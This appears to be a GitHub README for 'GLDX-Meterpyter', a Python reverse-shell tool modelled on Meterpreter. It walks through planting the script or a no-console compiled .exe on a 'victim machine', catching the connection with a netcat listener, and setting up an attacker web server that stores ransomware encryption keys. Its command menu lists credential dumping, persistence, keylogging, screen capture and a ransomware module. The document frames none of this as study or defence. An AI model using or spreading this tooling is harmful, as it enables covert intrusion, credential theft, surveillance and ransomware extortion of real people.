# GLDX-Meterpyter
Reverse Shell made in python / Acting as a Mini Meterpreter version 

## Installation / Execution

You first need to change LHOST IP Adress in Meterpyter.py

<img width="457" height="46" alt="image" src="https://github.com/user-attachments/assets/23a350ef-5491-4bc2-9945-45b65bdd9ba3" />


### Using it with Python (3.14)
Copy Meterpyter.py to your victim machine
 - pip install -r requirements
 - python .\Meterpyter.py

### Using .exe
You need a Windows Environnement to compile .py to .exe
 - pip install PyInstaller
 - PyInstaller --noconsole --onefile .\Meterpyter.py --clean

Then, copy dist/Meterpyter.exe to your victim machine and double click

### Execution 
On your attacking machine
 - nc -lvnp 4444 (or whatever port you want to change to)
<img width="325" height="24" alt="image" src="https://github.com/user-attachments/assets/ee18ffa9-7b33-40d7-96a7-6ccf564a5942" />

You now should have an opened reverse shell !



## Apache Configuration
Some module wille try to contact a web server to download/upload and store information when using customized commands
```shell
Ex : startransom -> GET 'key=123456' -> ransomware.php -> ...../ID/123456/key.txt
```
This will sends requests to the attacker web server, generating and storing the key to cryptolock the victime computer
To be sure that you have the correct configuration, you have to :
  - Put all .zip and .ps1 file in a new **download** directory (default /var/www/html/download)
  - Create a new **upload** directory (default /var/www/html/download)
  - Create a new **ransomware** directory (default ...../ransomware)
    - Important : Under ransomware/ create a **ID** directory
    - apply this
      ```bash
      sudo setfacl -R -m d:u::rwx,d:g::rwx,d:o::rwx ID/
      ```
To make your life easier, you can
```bash
sudo chmod 777 -R /var/www/html/
```



## Usage
First, you can type help to display the full commands menu
Some of them are not implemented yet, but you can still use :
 - Basic commands
   - cd
   - cat (powershell)
   - exit
   - help
     
 - Recon & Discovery
   - sysinfo
   - netstat
     
 - File Operation
   - search <path> <filename>
   - download
   - upload
   - zipupload (not zipdownload)

 - Persistence Mechanisms
   - addschedule
   - addstartup

 - Process & Service Management
   - ps

 - Credential Dump
   - lsadump
   - samdump

 - External Modules Management (Fully)

 - User Control
   - getscreen
   - startkeylogger
   - stopkeylogger

 - Ransomware Module
   - startransom or startransom <path> (NOT startransomware)
   - stopransom or stopransom <path> (NOT stopransomware)

 - Open Terminal
   - Powershell



